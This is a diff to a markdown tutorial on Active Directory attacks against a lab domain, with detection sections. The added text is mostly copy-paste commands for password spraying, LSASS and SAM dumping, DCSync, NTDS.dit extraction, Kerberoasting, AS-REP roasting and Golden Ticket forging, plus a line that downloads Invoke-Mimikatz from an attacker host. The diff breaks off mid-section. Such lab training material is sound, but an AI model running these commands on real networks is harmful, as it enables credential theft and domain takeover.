@@ -11,7 +11,7 @@ A comprehensive guide to understanding Active Directory attacks - including the 
 ```
                     ┌─────────────────────────────────────────┐
                     │          AKATSUKI.LOCAL                 │
-                    │           192.168.56.0/24               │
+                    │           10.10.12.0/24               │
                     └─────────────────────────────────────────┘
                                       │
          ┌────────────────────────────┼────────────────────────────┐
@@ -19,7 +19,7 @@ A comprehensive guide to understanding Active Directory attacks - including the 
          ▼                            ▼                            ▼
 ┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
 │      DC01       │         │      WS01       │         │      WS02       │
-│  192.168.56.10  │         │  192.168.56.11  │         │  192.168.56.12  │
+│  10.10.12.10  │         │  10.10.12.11  │         │  10.10.12.12  │
 │  Win Server 2022│         │   Windows 11    │         │   Windows 11    │
 │                 │         │                 │         │                 │
 │  Domain         │         │  Local Admin:   │         │  Local Admin:   │
@@ -127,38 +127,74 @@ Get-ADUser -Filter * -Properties SamAccountName | Select SamAccountName
 
 ### Attack Methods
 
-**Method 1: CrackMapExec (From Kali)**
+#### 🌐 REMOTE (From Kali/Attacker Machine)
+
+**CrackMapExec - SMB Spray**
 ```bash
 # Create user list
 echo -e "itachi\npain\nkisame\ndeidara\nsasori\norochimaru" > users.txt
 
 # Single password against all users
-crackmapexec smb 192.168.56.10 -u users.txt -p 'Password123!' --continue-on-success
+crackmapexec smb 10.10.12.10 -u users.txt -p 'Password123!' --continue-on-success
 
 # Multiple common passwords
-crackmapexec smb 192.168.56.10 -u users.txt -p passwords.txt --continue-on-success
+crackmapexec smb 10.10.12.10 -u users.txt -p passwords.txt --continue-on-success
+
+# WinRM spray
+crackmapexec winrm 10.10.12.0/24 -u users.txt -p 'Password123!'
+
+# LDAP spray
+crackmapexec ldap 10.10.12.10 -u users.txt -p 'Password123!'
 ```
 
-**Method 2: Kerbrute (Kerberos-based, stealthier)**
+**Kerbrute - Kerberos-based (stealthier, no SMB)**
 ```bash
-# Enumerate valid users first
-kerbrute userenum --dc 192.168.56.10 -d akatsuki.local users.txt
+# Enumerate valid users first (no auth needed!)
+kerbrute userenum --dc 10.10.12.10 -d akatsuki.local users.txt
 
-# Password spray
-kerbrute passwordspray --dc 192.168.56.10 -d akatsuki.local users.txt 'Password123!'
+# Password spray via Kerberos
+kerbrute passwordspray --dc 10.10.12.10 -d akatsuki.local users.txt 'Password123!'
 ```
 
-**Method 3: Spray (PowerShell, from domain-joined machine)**
+**Hydra - Multi-protocol**
+```bash
+# RDP spray
+hydra -L users.txt -p 'Password123!' rdp://10.10.12.11
+
+# SMB spray
+hydra -L users.txt -p 'Password123!' smb://10.10.12.10
+```
+
+**Crowbar - RDP specific**
+```bash
+crowbar -b rdp -s 10.10.12.11/32 -U users.txt -c 'Password123!'
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**DomainPasswordSpray.ps1**
 ```powershell
-# DomainPasswordSpray module
+# Download: https://github.com/dafthack/DomainPasswordSpray
 Import-Module .\DomainPasswordSpray.ps1
+
+# Spray single password
 Invoke-DomainPasswordSpray -Password "Password123!" -OutFile spray-results.txt
+
+# With custom user list
+Invoke-DomainPasswordSpray -UserList .\users.txt -Password "Password123!"
 ```
 
-**Method 4: Ruler (for O365/Exchange)**
-```bash
-# Against Exchange/OWA
-ruler --domain akatsuki.local brute --users users.txt --passwords passwords.txt
+**Rubeus - Kerberos spray**
+```powershell
+# Spray via AS-REQ (Kerberos)
+Rubeus.exe brute /passwords:passwords.txt /outfile:results.txt
+```
+
+**Native PowerShell - Quick test**
+```powershell
+# Test single credential
+$cred = New-Object System.Management.Automation.PSCredential("AKATSUKI\pain", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
+Get-ADUser -Identity pain -Credential $cred  # Success = valid creds
 ```
 
 ### Blue Team: Detection
@@ -191,8 +227,8 @@ THEN ALERT "Password Spray Detected"
 
 ### Alternative Methods
 
-- **RDP spray**: `crowbar -b rdp -s 192.168.56.11/32 -U users.txt -c 'Password123!'`
-- **WinRM spray**: `crackmapexec winrm 192.168.56.0/24 -u users.txt -p pass.txt`
+- **RDP spray**: `crowbar -b rdp -s 10.10.12.11/32 -U users.txt -c 'Password123!'`
+- **WinRM spray**: `crackmapexec winrm 10.10.12.0/24 -u users.txt -p pass.txt`
 - **LDAP spray**: Custom scripts using ldap3 Python library
 - **OWA/Exchange spray**: MailSniper, Ruler
 
@@ -227,42 +263,79 @@ BloodHound maps Active Directory relationships to find attack paths. It collects
 
 ### Attack Methods
 
-**From Windows (SharpHound):**
-```powershell
-# Download SharpHound
-# https://github.com/BloodHoundAD/SharpHound
+#### 🌐 REMOTE (From Kali/Attacker Machine)
 
-# Run as domain user
+**bloodhound-python - Remote collection**
+```bash
+# Install
+pip install bloodhound
+
+# Full collection (requires domain creds)
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -dc dc01.akatsuki.local -c All
+
+# DNS resolution issues? Use IP as nameserver
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
+
+# Specific collectors
+bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c Group,LocalAdmin,Session
+
+# With NTLM hash instead of password
+bloodhound-python -u orochimaru --hashes :NTHASH -d akatsuki.local -ns 10.10.12.10 -c All
+```
+
+**ldapdomaindump - Quick LDAP enum**
+```bash
+# Dump AD via LDAP
+ldapdomaindump -u 'akatsuki.local\orochimaru' -p 'Snake2024!' 10.10.12.10 -o ldap_dump/
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**SharpHound.exe - Windows collector**
+```powershell
+# Download: https://github.com/BloodHoundAD/SharpHound
+
+# Full collection (runs as current user context)
 .\SharpHound.exe -c All
 
 # Stealth collection (slower, less noisy)
 .\SharpHound.exe -c DCOnly --stealth
 
-# Specific collection
-.\SharpHound.exe -c Session,LoggedOn  # Just sessions
+# Specific collection methods
+.\SharpHound.exe -c Session,LoggedOn    # Just sessions
+.\SharpHound.exe -c Group,LocalAdmin    # Groups and local admins
+.\SharpHound.exe -c ACL                 # ACL enumeration
+
+# Loop collection (keep collecting sessions)
+.\SharpHound.exe -c Session --loop --loopduration 02:00:00
 ```
 
-**From Linux (bloodhound-python):**
-```bash
-# Install
-pip install bloodhound
+**SharpHound.ps1 - PowerShell version**
+```powershell
+# Import module
+Import-Module .\SharpHound.ps1
 
-# Collect
-bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -dc dc01.akatsuki.local -c All
-
-# DNS resolution issues? Use IP
-bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 192.168.56.10 -c All
+# Run collection
+Invoke-BloodHound -CollectionMethod All
 ```
 
-**Import to BloodHound:**
+**ADRecon - Comprehensive AD report**
+```powershell
+# Download: https://github.com/adrecon/ADRecon
+.\ADRecon.ps1 -OutputDir C:\temp\adrecon
+```
+
+#### 📊 Import to BloodHound (On Attacker Machine)
+
 ```bash
-# Start neo4j
+# Start neo4j database
 sudo neo4j console
 
-# Start BloodHound
+# Start BloodHound GUI
 bloodhound
 
-# Drag and drop .json files to import
+# Login (default: neo4j/neo4j, change on first login)
+# Drag and drop .json/.zip files to import
 ```
 
 ### Blue Team: Detection
@@ -342,55 +415,101 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAs
 
 ### Attack Methods
 
-**Method 1: Mimikatz (In-Memory)**
+#### 🌐 REMOTE (From Kali - requires admin creds/hash)
+
+**Impacket secretsdump - Remote LSASS dump**
+```bash
+# With password - dumps SAM, LSA secrets, and cached creds
+secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21
+
+# With NTLM hash
+secretsdump.py -hashes :NTHASH AKATSUKI/pain@10.10.12.21
+
+# Just LSA secrets (includes cached domain creds)
+secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21 -just-dc-user
+
+# Target specific host, dump everything
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.21
+```
+
+**CrackMapExec - Mass credential dump**
+```bash
+# Dump SAM (local accounts)
+crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam
+
+# Dump LSA secrets
+crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --lsa
+
+# Dump LSASS via lsassy module
+crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' -M lsassy
+
+# With hash
+crackmapexec smb 10.10.12.21 -u pain -H NTHASH --lsa
+```
+
+**lsassy - Dedicated LSASS dumper**
+```bash
+# Remote LSASS dump and parse
+lsassy -u pain -p 'Password123!' -d AKATSUKI 10.10.12.21
+```
+
+#### 💻 LOCAL (With Admin Shell on Target)
+
+**Mimikatz - In-Memory extraction**
 ```powershell
-# Requires admin/SYSTEM
+# Requires admin/SYSTEM privileges
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords    # Dump all credentials
 mimikatz # sekurlsa::msv               # Dump NTLM hashes only
 mimikatz # sekurlsa::wdigest           # Dump WDigest (plaintext if enabled)
 mimikatz # sekurlsa::kerberos          # Dump Kerberos tickets
+mimikatz # sekurlsa::credman           # Credential Manager secrets
 ```
 
-**Method 2: LSASS Dump + Offline Extraction**
+**LSASS Dump Methods (dump file for offline analysis)**
 ```powershell
-# Create dump file (various methods)
-
 # Task Manager (GUI)
 # Right-click lsass.exe → Create dump file
 
 # Procdump (Sysinternals - often whitelisted)
-procdump.exe -ma lsass.exe lsass.dmp
+procdump.exe -ma lsass.exe C:\temp\lsass.dmp
 
 # comsvcs.dll (LOLBin - Living off the Land)
-# Get LSASS PID first
 $pid = (Get-Process lsass).Id
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\lsass.dmp full
 
-# PowerShell (Out-Minidump)
+# PowerShell (Out-Minidump from PowerSploit)
 Out-Minidump -Process (Get-Process lsass) -DumpFilePath C:\temp\lsass.dmp
+
+# ProcDump clone - MiniDumpWriteDump
+.\nanodump.exe --write C:\temp\lsass.dmp
 ```
 
-```bash
-# Parse dump offline (on attacker machine)
-pypykatz lsa minidump lsass.dmp
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords
-```
-
-**Method 3: Invoke-Mimikatz (PowerShell)**
+**Invoke-Mimikatz - Reflective PowerShell**
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
+# Load in memory (no file on disk)
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds
 ```
 
-**Method 4: SafetyKatz / NanoDump (EDR evasion)**
+**SafetyKatz / NanoDump (EDR evasion)**
 ```powershell
-# SafetyKatz - modified mimikatz
+# SafetyKatz - modified mimikatz, dumps in-memory
 SafetyKatz.exe
 
-# NanoDump - creates minidump with obfuscation
+# NanoDump - creates obfuscated minidump
 NanoDump.exe --write C:\temp\out.dmp
+```
+
+#### 📤 Parse Dump Offline (On Attacker Machine)
+
+```bash
+# pypykatz - Pure Python mimikatz (no Windows needed)
+pypykatz lsa minidump lsass.dmp
+
+# Mimikatz offline parsing
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
 ```
 
 ### Blue Team: Detection
@@ -478,42 +597,86 @@ Location: `C:\Windows\System32\config\SAM` (encrypted with SYSTEM key)
 
 ### Attack Methods
 
-**Method 1: Registry Save (Requires Admin)**
+#### 🌐 REMOTE (From Kali - requires local admin creds)
+
+**Impacket secretsdump - Remote SAM dump**
+```bash
+# Dump SAM remotely (requires local admin on target)
+secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21
+
+# With hash
+secretsdump.py -hashes :NTHASH AKATSUKI/pain@10.10.12.21
+
+# Local account on workstation
+secretsdump.py ./Administrator:'LocalPass123'@10.10.12.21
+```
+
+**CrackMapExec - SAM dump**
+```bash
+# Dump SAM from single host
+crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam
+
+# Dump SAM from multiple hosts
+crackmapexec smb 10.10.12.0/24 -u pain -p 'Password123!' --sam
+
+# Also dump LSA secrets and cached creds
+crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam --lsa
+```
+
+**reg.py - Remote registry operations**
+```bash
+# Save SAM remotely (creates files on target, then download)
+reg.py AKATSUKI/pain:'Password123!'@10.10.12.21 save -keyName 'HKLM\SAM' -o '\\10.10.12.21\C$\temp\sam'
+reg.py AKATSUKI/pain:'Password123!'@10.10.12.21 save -keyName 'HKLM\SYSTEM' -o '\\10.10.12.21\C$\temp\system'
+```
+
+#### 💻 LOCAL (With Admin Shell on Target)
+
+**Registry Save Method**
 ```powershell
-# Save registry hives
+# Save registry hives (requires admin)
 reg save HKLM\SAM C:\temp\sam.save
 reg save HKLM\SYSTEM C:\temp\system.save
 reg save HKLM\SECURITY C:\temp\security.save
 
-# Transfer to attacker machine, then:
+# Transfer files to attacker machine for offline extraction
 ```
 
-```bash
-# Extract offline with Impacket
-secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
-```
-
-**Method 2: Volume Shadow Copy**
+**Volume Shadow Copy Method**
 ```powershell
-# Create shadow copy
+# Create shadow copy (bypasses file locks)
 vssadmin create shadow /for=C:
 
-# Copy from shadow (bypasses file locks)
+# Find shadow copy name
+vssadmin list shadows
+
+# Copy from shadow
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
 ```
 
-**Method 3: Mimikatz**
+**Mimikatz - Direct extraction**
 ```powershell
 mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::sam
 ```
 
-**Method 4: Impacket (Remote)**
+**esentutl - Native Windows tool**
+```powershell
+# Copy locked files using esentutl
+esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam
+esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\system
+```
+
+#### 📤 Parse Dump Offline (On Attacker Machine)
+
 ```bash
-# Requires local admin creds
-secretsdump.py AKATSUKI/pain:'Password123!'@192.168.56.11 -just-dc-ntlm
+# Extract hashes from saved files
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+
+# Using pypykatz
+pypykatz registry --sam sam.save --system system.save
 ```
 
 ### Blue Team: Detection & Prevention
@@ -595,36 +758,77 @@ Write-Host "Granted DCSync rights to $user" -ForegroundColor Yellow
 
 ### Attack Methods
 
-**Method 1: Mimikatz**
-```powershell
-# DCSync specific user
-mimikatz # lsadump::dcsync /user:AKATSUKI\Administrator
+#### 🌐 REMOTE (From Kali - requires DCSync rights)
 
-# DCSync all users
-mimikatz # lsadump::dcsync /all /csv
+**Impacket secretsdump - DCSync**
+```bash
+# With password - dump all domain hashes
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
+
+# With NTLM hash
+secretsdump.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.10
+
+# Just NTDS (all users, cleaner output)
+secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
+
+# Just specific user (e.g., krbtgt for Golden Ticket)
+secretsdump.py -just-dc-user krbtgt AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
+secretsdump.py -just-dc-user Administrator AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
+
+# Output to file
+secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -outputfile domain_hashes
+```
+
+**CrackMapExec - DCSync**
+```bash
+# Dump NTDS.dit via DCSync
+crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds
+
+# With hash
+crackmapexec smb 10.10.12.10 -u itachi -H NTHASH --ntds
+
+# Dump specific user only
+crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds --user krbtgt
+```
+
+**NetExec (updated CME)**
+```bash
+netexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**Mimikatz - DCSync**
+```powershell
+# DCSync specific user (requires domain user context with DCSync rights)
+mimikatz # lsadump::dcsync /user:AKATSUKI\Administrator
 
 # DCSync krbtgt (for Golden Ticket)
 mimikatz # lsadump::dcsync /user:AKATSUKI\krbtgt
+
+# DCSync all users (takes time)
+mimikatz # lsadump::dcsync /all /csv
+
+# Specify domain and DC
+mimikatz # lsadump::dcsync /user:Administrator /domain:akatsuki.local /dc:dc01.akatsuki.local
 ```
 
-**Method 2: Impacket secretsdump**
-```bash
-# With password
-secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10
-
-# With NTLM hash
-secretsdump.py -hashes :NTHASH AKATSUKI/itachi@192.168.56.10
-
-# Just NTDS (all users)
-secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10
-
-# Just krbtgt
-secretsdump.py -just-dc-user krbtgt AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10
+**SharpKatz - C# Mimikatz**
+```powershell
+# DCSync via SharpKatz
+SharpKatz.exe --Command dcsync --User Administrator --Domain akatsuki.local --DomainController dc01.akatsuki.local
 ```
 
-**Method 3: CrackMapExec**
-```bash
-crackmapexec smb 192.168.56.10 -u itachi -p 'Akatsuki123!' --ntds
+**DSInternals PowerShell Module**
+```powershell
+# Install module
+Install-Module DSInternals -Force
+
+# Get specific user hash
+Get-ADReplAccount -SamAccountName Administrator -Server dc01.akatsuki.local
+
+# Get krbtgt hash
+Get-ADReplAccount -SamAccountName krbtgt -Server dc01.akatsuki.local
 ```
 
 ### Blue Team: Detection
@@ -706,6 +910,27 @@ Location: `C:\Windows\NTDS\ntds.dit` (on DCs only)
 
 ### Attack Methods
 
+#### 🌐 REMOTE (From Kali - requires DC admin creds)
+
+```bash
+# secretsdump.py can extract NTDS.dit remotely via DRSUAPI (DCSync)
+# This is preferred over file extraction
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc
+
+# If you have file access via SMB, download after local extraction
+smbclient.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
+# smb: \> get C:\temp\ntds.dit
+# smb: \> get C:\temp\SYSTEM
+
+# CrackMapExec - one-liner DCSync
+crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds
+
+# Extract from downloaded files
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+#### 💻 LOCAL (With Admin Shell on DC)
+
 **Method 1: VSS Shadow Copy**
 ```powershell
 # On the DC (requires admin)
@@ -714,11 +939,6 @@ vssadmin create shadow /for=C:
 # Copy files
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
-```
-
-```bash
-# Extract hashes offline
-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 **Method 2: ntdsutil**
@@ -752,6 +972,22 @@ copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 ```powershell
 # Bypasses file locks without VSS
 Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
+```
+
+**Method 5: Mimikatz DCSync (local execution)**
+```powershell
+# DCSync from DC itself
+mimikatz # lsadump::dcsync /all /csv
+```
+
+#### 📤 Parse Dump Offline (On Attacker Machine)
+
+```bash
+# Extract hashes from downloaded files
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# Using pypykatz
+pypykatz registry --sam sam --system system --ntds ntds.dit
 ```
 
 ### Blue Team: Detection & Prevention
@@ -857,39 +1093,87 @@ Write-Host "Created svc_sql with SPN - vulnerable to Kerberoasting" -ForegroundC
 
 ### Attack Methods
 
-**Method 1: Rubeus (Windows)**
+#### 🌐 REMOTE (From Kali - requires any domain creds)
+
+**Impacket GetUserSPNs - Kerberoast**
+```bash
+# Find SPNs and request tickets (any domain user works!)
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request
+
+# Output in hashcat format
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile hashes.txt
+
+# With NTLM hash
+GetUserSPNs.py -hashes :NTHASH AKATSUKI/orochimaru -dc-ip 10.10.12.10 -request
+
+# Just list SPNs (no ticket request)
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
+
+# Target specific user
+GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -target-domain akatsuki.local
+```
+
+**CrackMapExec Kerberoast Module**
+```bash
+# Kerberoast via CME
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' --kerberoasting output.txt
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**Rubeus - Kerberoasting**
 ```powershell
 # Kerberoast all SPNs
 Rubeus.exe kerberoast /outfile:hashes.txt
 
 # Kerberoast specific user
 Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
+
+# Request RC4 ticket (easier to crack)
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+
+# Request AES ticket (if RC4 disabled)
+Rubeus.exe kerberoast /aes /outfile:hashes.txt
+
+# With alternate credentials
+Rubeus.exe kerberoast /creduser:AKATSUKI\orochimaru /credpassword:Snake2024! /outfile:hashes.txt
 ```
 
-**Method 2: Impacket GetUserSPNs (Linux)**
-```bash
-# Request tickets
-GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request
-
-# Output hashcat format
-GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request -outputfile hashes.txt
-```
-
-**Method 3: PowerView**
+**PowerView - Kerberoasting**
 ```powershell
 # Find Kerberoastable accounts
 Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 
-# Request tickets
+# Request tickets and output hashcat format
 Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
+
+# Save to file
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt
 ```
 
-**Cracking:**
+**Native PowerShell (no tools needed)**
+```powershell
+# Find SPNs
+Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
+
+# Request ticket for specific SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.akatsuki.local:1433"
+
+# Export tickets
+klist
+```
+
+#### 🔓 Cracking (On Attacker Machine)
+
 ```bash
-# Hashcat (mode 13100 = Kerberos 5 TGS-REP)
+# Hashcat (mode 13100 = Kerberos 5 TGS-REP RC4)
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 
-# John
+# AES256 tickets (mode 19700)
+hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# John the Ripper
 john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -956,34 +1240,79 @@ Write-Host "sasori is now vulnerable to AS-REP Roasting" -ForegroundColor Yellow
 
 ### Attack Methods
 
-**Method 1: Rubeus (Windows)**
+#### 🌐 REMOTE (From Kali - NO creds needed for roasting!)
+
+**Impacket GetNPUsers - AS-REP Roast**
+```bash
+# WITHOUT credentials - just need username list!
+GetNPUsers.py AKATSUKI/ -dc-ip 10.10.12.10 -usersfile users.txt -no-pass -format hashcat
+
+# Target specific user (no creds needed)
+GetNPUsers.py AKATSUKI/sasori -dc-ip 10.10.12.10 -no-pass -format hashcat
+
+# WITH credentials - auto-finds vulnerable users
+GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request
+
+# Using NTLM hash
+GetNPUsers.py AKATSUKI/orochimaru -hashes :NTHASH -dc-ip 10.10.12.10 -request
+
+# Output to file
+GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile asrep.txt
+```
+
+**CrackMapExec AS-REP Module**
+```bash
+# Find and roast AS-REP vulnerable users
+crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' --asreproast output.txt
+
+# Without creds (just enumerate, requires user list)
+crackmapexec ldap 10.10.12.10 -u users.txt -p '' --asreproast output.txt
+```
+
+**Kerbrute - User enumeration + AS-REP**
+```bash
+# Enumerate users AND check AS-REP roastable
+kerbrute userenum --dc 10.10.12.10 -d akatsuki.local users.txt
+```
+
+#### 💻 LOCAL (With Shell on Domain-Joined Machine)
+
+**Rubeus - AS-REP Roast**
 ```powershell
 # AS-REP roast all vulnerable users
 Rubeus.exe asreproast /outfile:asrep.txt
 
 # Target specific user
-Rubeus.exe asreproast /user:sasori
+Rubeus.exe asreproast /user:sasori /outfile:asrep.txt
+
+# Output in different formats
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe asreproast /format:john /outfile:asrep.txt
 ```
 
-**Method 2: Impacket GetNPUsers (Linux)**
-```bash
-# No credentials needed! Just need usernames
-GetNPUsers.py AKATSUKI/ -dc-ip 192.168.56.10 -usersfile users.txt -no-pass -format hashcat
-
-# With credentials (finds vulnerable users automatically)
-GetNPUsers.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 192.168.56.10 -request
-```
-
-**Method 3: PowerView**
+**PowerView - Find vulnerable users**
 ```powershell
 # Find AS-REP roastable users
 Get-DomainUser -PreauthNotRequired
+
+# With more details
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname
 ```
 
-**Cracking:**
+**Native AD PowerShell**
+```powershell
+# Find users without pre-auth
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+```
+
+#### 🔓 Cracking (On Attacker Machine)
+
 ```bash
 # Hashcat (mode 18200 = AS-REP)
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# John the Ripper
+john --format=krb5asrep asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ### Blue Team: Detection & Prevention
@@ -1029,7 +1358,7 @@ The TGT is encrypted with the **krbtgt** hash. With this hash, forge TGTs for AN
 # This means you already have domain admin (DCSync) or NTDS.dit
 
 # Step 1: Get krbtgt hash via DCSync (requires Domain Admin)
-secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@192.168.56.10 -just-dc-user krbtgt
+secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc-user krbtgt
 
 # Note the NTLM hash for krbtgt
 
@@ -1040,34 +1369,80 @@ Get-ADDomain | Select DomainSID
 
 ### Attack Methods
 
-**Method 1: Mimikatz**
-```powershell
-# Create Golden Ticket
-mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt
+#### 🌐 REMOTE (From Kali - Create and use Golden Ticket)
 
-# With specific groups (512=Domain Admins)
-mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /groups:512,519,518,520 /ptt
-
-# Save to file instead
-mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ticket:golden.kirbi
-```
-
-**Method 2: Rubeus**
-```powershell
-Rubeus.exe golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /rc4:KRBTGT_HASH /ptt
-
-# AES256 (stealthier)
-Rubeus.exe golden /aes256:AES_HASH /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /ptt
-```
-
-**Method 3: Impacket ticketer**
+**Impacket ticketer - Create Golden Ticket**
 ```bash
-# Create ticket
-ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin
+# Create golden ticket (saves as .ccache file)
+ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin
 
-# Use ticket
+# With AES key (stealthier)
+ticketer.py -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-XXXXX -domain akatsuki.local fakeadmin
+
+# With specific groups (512=DA, 519=EA, 518=Schema Admins, 520=GPO Creator)
+ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXXX -domain akatsuki.local -groups 512,519,518,520 fakeadmin
+```
+
+**Using the Golden Ticket from Linux**
+```bash
+# Export ticket to environment
 export KRB5CCNAME=fakeadmin.ccache
+
+# Now use any impacket tool with Kerberos auth (-k -no-pass)
 psexec.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
+wmiexec.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
+secretsdump.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
+smbclient.py -k -no-pass akatsuki.local/fakeadmin@dc01.akatsuki.local
+```
+
+**CrackMapExec with ticket**
+```bash
+export KRB5CCNAME=fakeadmin.ccache
+crackmapexec smb dc01.akatsuki.local -k --ntds
+```
+
+#### 💻 LOCAL (With Shell on Windows)
+
+**Mimikatz - Create Golden Ticket**
+```powershell
+# Create and inject Golden Ticket into current session
+mimikatz # kerberos::golden /user:fakeadmin /domain:akatsuki.local /sid:S-1-5-21-XXXXX /krbtgt:KRBTGT_NTHASH /ptt
+
+# With specific groups
